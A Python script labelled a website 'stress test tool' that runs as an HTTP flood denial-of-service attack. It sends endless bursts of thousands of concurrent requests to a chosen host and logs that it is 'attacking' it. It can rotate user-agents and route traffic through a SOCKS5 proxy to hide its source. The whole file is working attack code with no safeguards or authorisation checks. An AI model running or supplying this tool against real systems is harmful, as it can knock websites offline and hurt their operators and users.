#!/usr/bin/env python3

import argparse
import logging
import random
import socket
import sys
import time
import asyncio
import aiohttp
import uvloop

parser = argparse.ArgumentParser(description="Super Advanced Stress Test Tool for Websites")
parser.add_argument("host", nargs="?", help="Host to perform stress test on")
parser.add_argument("-p", "--port", default=443, help="Port of webserver, usually 443 for HTTPS", type=int)
parser.add_argument("-s", "--sockets", default=10000, help="Number of sockets to use in the test", type=int)
parser.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="Increases logging")
parser.add_argument("-ua", "--randuseragents", dest="randuseragent", action="store_true", help="Randomizes user-agents with each request")
parser.add_argument("-x", "--useproxy", dest="useproxy", action="store_true", help="Use a SOCKS5 proxy for connecting")
parser.add_argument("--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host")
parser.add_argument("--proxy-port", default=1080, help="SOCKS5 proxy port", type=int)
parser.add_argument("--https", dest="https", action="store_true", help="Use HTTPS for the requests")
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(useproxy=False)
parser.set_defaults(https=False)
args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required!")
    parser.print_help()
    sys.exit(1)

if args.useproxy:
    try:
        import socks

        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
        socket.socket = socks.socksocket
        logging.info("Using SOCKS5 proxy for connecting...")
    except ImportError:
        logging.error("Socks Proxy Library Not Available!")
        sys.exit(1)

logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.DEBUG if args.verbose else logging.INFO,
)

async def init_socket_async(ip: str, session):
    try:
        scheme = "https" if args.https else "http"
        url = f"{scheme}://{ip}:{args.port}/?{random.randint(0, 2000)}"
        ua = user_agents[0]
        if args.randuseragent:
            ua = random.choice(user_agents)
        headers = {"User-Agent": ua, "Accept-language": "en-US,en,q=0.5", "Connection": "keep-alive"}
        async with session.get(url, headers=headers) as s:
            logging.debug("Socket initialized for %s", ip)
            return s
    except:
        return None

async def pyflood_iteration_async(session):
    logging.info("Sending burst of requests...")
    logging.info("Socket count: %s", len(list_of_sockets))

    tasks = [init_socket_async(args.host, session) for _ in range(args.sockets)]
    sockets = await asyncio.gather(*tasks)

    # Filter out None values (failed socket initializations)
    sockets = [s for s in sockets if s]

    list_of_sockets.extend(sockets)

async def main_async():
    ip = args.host
    socket_count = args.sockets
    logging.info("Attacking %s with %s sockets.", ip, socket_count)

    logging.info("Creating sockets...")
    ssl_context = None if args.https else aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=ssl_context) as session:
        while True:
            try:
                await pyflood_iteration_async(session)
            except Exception as e:
                logging.debug("Error in pyflood iteration: %s", e)

if __name__ == "__main__":
    list_of_sockets = []
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    ]

    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    asyncio.run(main_async())
